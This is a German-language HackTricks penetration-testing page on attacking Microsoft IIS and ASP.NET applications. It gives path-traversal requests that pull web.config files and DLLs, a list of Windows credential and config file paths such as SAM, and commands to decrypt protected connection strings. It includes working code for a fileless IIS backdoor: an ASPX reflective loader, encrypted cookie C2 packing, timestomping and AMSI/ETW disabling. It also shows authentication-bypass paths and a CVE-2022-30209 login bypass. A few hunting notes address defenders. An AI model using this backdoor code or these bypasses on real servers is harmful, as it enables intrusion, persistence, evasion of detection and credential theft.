# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

Zu testende ausführbare Dateiendungen:

- asp
- aspx
- config
- php

## Offenlegung interner IP-Adressen

Auf jedem IIS-Server, auf dem Sie einen 302 erhalten, können Sie versuchen, den Host header zu entfernen und HTTP/1.0 zu verwenden; in der Antwort könnte der Location header auf die interne IP-Adresse verweisen:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Antwort, die die interne IP offenlegt:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config-Dateien ausführen

Du kannst .config-Dateien hochladen und sie nutzen, um Code auszuführen. Eine Möglichkeit ist, den Code am Ende der Datei innerhalb eines HTML-Kommentars anzuhängen: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Mehr Informationen und Techniken, um diese Schwachstelle auszunutzen, findest du [hier](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

Download the list that I have created:

{{#file}}
iisfinal.txt
{{#endfile}}

Sie wurde erstellt, indem die Inhalte der folgenden Listen zusammengeführt wurden:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Verwende sie ohne zusätzliche Erweiterung, die Dateien, die eine benötigen, haben diese bereits.

## Path Traversal

### Leaking source code

Check the full writeup in: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> Als Zusammenfassung gibt es mehrere web.config-Dateien in den Ordnern der Anwendung mit Referenzen auf "**assemblyIdentity**"-Dateien und "**namespaces**". Mit diesen Informationen ist es möglich zu wissen, **wo sich ausführbare Dateien befinden** und sie herunterzuladen.\
> Aus den **downloaded Dlls** ist es außerdem möglich, **neue namespaces** zu finden, in denen du versuchen solltest, auf die web.config-Datei zuzugreifen, um weitere namespaces und assemblyIdentity zu finden.\
> Außerdem können die Dateien **connectionstrings.config** und **global.asax** interessante Informationen enthalten.

In **.Net MVC applications**, die **web.config**-Datei spielt eine entscheidende Rolle, indem sie jede Binärdatei angibt, auf die die Anwendung durch **"assemblyIdentity"** XML-Tags angewiesen ist.

### **Untersuchung von Binärdateien**

An example of accessing the **web.config** file is shown below:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Diese Anfrage offenbart verschiedene Einstellungen und Abhängigkeiten, wie zum Beispiel:

- **EntityFramework** Version
- **AppSettings** für Webseiten, Client-Validierung und JavaScript
- **System.web** Konfigurationen für Authentifizierung und Runtime
- **System.webServer** Moduleinstellungen
- **Runtime** Assembly-Bindings für zahlreiche Bibliotheken wie **Microsoft.Owin**, **Newtonsoft.Json** und **System.Web.Mvc**

Diese Einstellungen deuten darauf hin, dass bestimmte Dateien, wie **/bin/WebGrease.dll**, sich im /bin-Ordner der Anwendung befinden.

### **Root Directory Files**

Dateien im Stammverzeichnis, wie **/global.asax** und **/connectionstrings.config** (die sensible Passwörter enthalten), sind für die Konfiguration und den Betrieb der Anwendung unerlässlich.

### **Namespaces and Web.Config**

MVC-Anwendungen definieren außerdem zusätzliche **web.config**-Dateien für bestimmte Namespaces, um wiederholte Deklarationen in jeder Datei zu vermeiden, wie durch eine Anfrage zum Herunterladen einer weiteren **web.config** demonstriert wird:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Herunterladen von DLLs**

Die Erwähnung eines benutzerdefinierten Namespace deutet auf eine DLL mit dem Namen "**WebApplication1**" im Verzeichnis /bin hin. Darauf folgt eine Anfrage zum Herunterladen der **WebApplication1.dll**:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Dies deutet auf das Vorhandensein anderer wichtiger DLLs hin, wie **System.Web.Mvc.dll** und **System.Web.Optimization.dll**, im Verzeichnis /bin.

In einem Szenario, in dem eine DLL einen Namespace namens **WebApplication1.Areas.Minded** importiert, könnte ein Angreifer auf das Vorhandensein weiterer web.config-Dateien in vorhersehbaren Pfaden schließen, wie z. B. **/area-name/Views/**, die bestimmte Konfigurationen und Verweise auf andere DLLs im /bin-Ordner enthalten. Zum Beispiel kann eine Anfrage an **/Minded/Views/web.config** Konfigurationen und Namespaces offenbaren, die auf das Vorhandensein einer weiteren DLL, **WebApplication1.AdditionalFeatures.dll**, hinweisen.

### Häufige Dateien

Von [hier](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Fehler

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Das bedeutet, dass der Server im Host header **nicht den korrekten Domainnamen erhalten hat**.  
Um auf die Webseite zuzugreifen, kannst du dir das servierte **SSL Certificate** ansehen — vielleicht findest du dort den Domain-/Subdomain-Namen. Wenn es dort nicht vorhanden ist, musst du möglicherweise **brute force VHosts** anwenden, bis du den richtigen findest.

## Verschlüsselte Konfiguration und ASP.NET Core Data Protection key rings entschlüsseln

Zwei gängige Muster, um Secrets in auf IIS-hosted .NET apps geschützten Anwendungen zu sichern, sind:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) für web.config-Abschnitte wie <connectionStrings>.
- ASP.NET Core Data Protection key ring (persisted locally), verwendet zum Schutz von Anwendungsecrets und Cookies.

Wenn du Dateisystem- oder interaktiven Zugriff auf den Webserver hast, erlauben co-located keys oft die Entschlüsselung.

- ASP.NET (Full Framework) – entschlüssle geschützte Konfigurationsabschnitte mit aspnet_regiis:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – suchen Sie nach Data Protection key rings, die lokal gespeichert sind (XML/JSON-Dateien) an Orten wie:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

Mit dem verfügbaren key ring kann ein Operator, der in der Identität der App läuft, einen IDataProtector mit denselben purposes instanziieren und gespeicherte Secrets unprotecten. Fehlkonfigurationen, die den key ring zusammen mit den App-Dateien ablegen, machen die Offline-Entschlüsselung trivial, sobald der Host kompromittiert ist.

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

Das Phantom Taurus/NET-STAR Toolkit zeigt ein ausgereiftes Muster für fileless IIS-Persistenz und Post‑Exploitation vollständig innerhalb von w3wp.exe. Die Kernideen sind breit wiederverwendbar für eigene Tradecrafts sowie für Detection/Hunting.

Wesentliche Bausteine
- ASPX bootstrapper hosting an embedded payload: Eine einzelne .aspx-Seite (z. B. OutlookEN.aspx) trägt eine Base64‑kodierte, optional Gzip‑komprimierte .NET DLL. Bei einer Trigger-Anfrage decodiert, dekomprimiert und lädt sie diese reflectively in das aktuelle AppDomain und ruft den Haupteinstiegspunkt auf (z. B. ServerRun.Run()).
- Cookie‑scoped, encrypted C2 with multi‑stage packing: Aufgaben/Ergebnisse werden mit Gzip → AES‑ECB/PKCS7 → Base64 verpackt und über scheinbar legitime, cookie‑reiche Requests übertragen; Operatoren nutzten stabile Delimiter (z. B. "STAR") zum Chunking.
- Reflective .NET execution: Akzeptiert beliebige managed assemblies als Base64, lädt sie via Assembly.Load(byte[]) und übergibt Operator‑Argumente für schnelle Modulwechsel ohne Disk-Kontakt.
- Operating in precompiled ASP.NET sites: Fügt Hilfs‑Shells/Backdoors hinzu bzw. verwaltet diese, selbst wenn die Site prekompiliert ist (z. B. fügt ein dropper dynamische Seiten/Handler hinzu oder nutzt config handlers) – exponiert durch Befehle wie bypassPrecompiledApp, addshell, listshell, removeshell.
- Timestomping/metadata forgery: Bietet eine changeLastModified-Action und timestompt beim Deployment (einschließlich zukünftiger Kompilations-Timestamps), um DFIR zu erschweren.
- Optional AMSI/ETW pre‑disable for loaders: Ein Second‑Stage‑Loader kann AMSI und ETW deaktivieren, bevor Assembly.Load aufgerufen wird, um die Inspektion von In‑Memory‑Payloads zu reduzieren.

Minimal ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
Packing/crypto-Helfer (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Cookie/Session-Ablauf und Befehlsoberfläche
- Der Session-Bootstrap und das Tasking werden über cookies übertragen, um sich in normale Webaktivität einzufügen.
- In freier Wildbahn beobachtete Befehle umfassten: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; und die dynamischen Ausführungsprimitiven code_self, code_pid, run_code für In‑Memory-.NET-Ausführung.

Timestomping-Dienstprogramm
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Inline-Deaktivierung von AMSI/ETW vor Assembly.Load (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
Siehe AMSI/ETW bypass techniques in: windows-hardening/av-bypass.md

Hunting-Notizen (Verteidiger)
- Ein einzelne, ungewöhnliche ASPX-Seite mit sehr langen Base64/Gzip-Blobs; stark cookie-lastige POST-Anfragen.
- Unbelegte managed modules innerhalb von w3wp.exe; Strings wie Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run.
- Wiederholte Delimiter wie "STAR" im Traffic; nicht übereinstimmende oder sogar zukünftige Zeitstempel in ASPX/Assemblies.

## Telerik UI WebResource.axd unsafe reflection (CVE-2025-3600)

Viele ASP.NET-Apps binden Telerik UI for ASP.NET AJAX ein und exponieren den nicht authentifizierten Handler Telerik.Web.UI.WebResource.axd. Wenn der Image Editor Cache-Endpunkt erreichbar ist (type=iec), ermöglichen die Parameter dkey=1 und prtype unsafe reflection, die jeden öffentlichen parameterlosen Konstruktor pre‑auth ausführt. Das ergibt eine universelle DoS-Primitive und kann bei Apps mit unsicheren AppDomain.AssemblyResolve-Handlern zu pre‑auth RCE eskalieren.

Siehe detaillierte Techniken und PoCs hier:

{{#ref}}
telerik-ui-aspnet-ajax-unsafe-reflection-webresource-axd.md
{{#endref}}

## Alte IIS-Schwachstellen, die es sich zu prüfen lohnt


### Microsoft IIS tilde character “\~” Vulnerability/Feature – Offenlegung kurzer Datei-/Ordnernamen

Du kannst versuchen, **Ordner und Dateien zu enumerieren** innerhalb jedes entdeckten Ordners (auch wenn Basic Authentication erforderlich ist) mit dieser **Technik**.\
Die Hauptbegrenzung dieser Technik, falls der Server verwundbar ist, ist, dass **sie nur bis zu den ersten 6 Buchstaben des Namens jeder Datei/jedes Ordners und die ersten 3 Buchstaben der Dateiendung** finden kann.

Du kannst [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) verwenden, um diese Schwachstelle zu testen:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Originalrecherche: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

Du kannst auch **metasploit** verwenden: `use scanner/http/iis_shortname_scanner`

Eine gute Idee, um den **finalen Namen** der entdeckten Dateien zu **finden**, ist es, **LLMs** nach Optionen zu fragen, wie es im Script [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py) gemacht wird.

### Basic Authentication bypass

**Umgehung** einer Basic Authentication (**IIS 7.5**) durch Zugriff auf: `/admin:$i30:$INDEX_ALLOCATION/admin.php` oder `/admin::$INDEX_ALLOCATION/admin.php`

Du kannst versuchen, diese **Vulnerability** mit der vorherigen zu **mixen**, um neue **Folders** zu finden und die Authentifizierung zu **bypass**en.

## ASP.NET Trace.AXD aktiviertes Debugging

ASP.NET enthält einen Debugging-Modus, dessen Datei `trace.axd` heißt.

Er führt ein sehr detailliertes Log aller Requests, die an eine Anwendung über einen Zeitraum gesendet wurden.

Diese Informationen beinhalten Remote-Client-IPs, Session-IDs, alle Request- und Response-Cookies, physische Pfade, Sourcecode-Informationen und potenziell sogar Benutzernamen und Passwörter.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH-Cookie

ASPXAUTH verwendet die folgenden Informationen:

- **`validationKey`** (string): hex-kodierter Schlüssel zur Validierung der Signatur.
- **`decryptionMethod`** (string): (Standard “AES”).
- **`decryptionIV`** (string): hex-kodierter Initialisierungsvektor (Standard ist ein Vektor aus Nullen).
- **`decryptionKey`** (string): hex-kodierter Schlüssel zur Dekryptierung.

Allerdings verwenden einige Leute die **Standardwerte** dieser Parameter und setzen als **Cookie die E‑Mail des Users**. Daher: Wenn du eine Website findest, die dieselbe Plattform verwendet und ASPXAUTH-Cookies nutzt, und du dort einen User mit der E‑Mail desjenigen erstellst, den du impersonifizieren möchtest, kannst du ggf. den Cookie vom zweiten Server im ersten wiederverwenden und den User impersonifizieren.\
Dieser Angriff funktionierte in diesem [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS-Authentifizierungsumgehung mit zwischengespeicherten Passwörtern (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Ein Bug im Code **prüfte das vom Benutzer angegebene Passwort nicht korrekt**, sodass ein Angreifer, dessen **Password-Hash auf einen Schlüssel** trifft, der bereits im **Cache** vorhanden ist, sich als dieser Benutzer einloggen kann.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## Referenzen

- [Unit 42 – Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass background (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
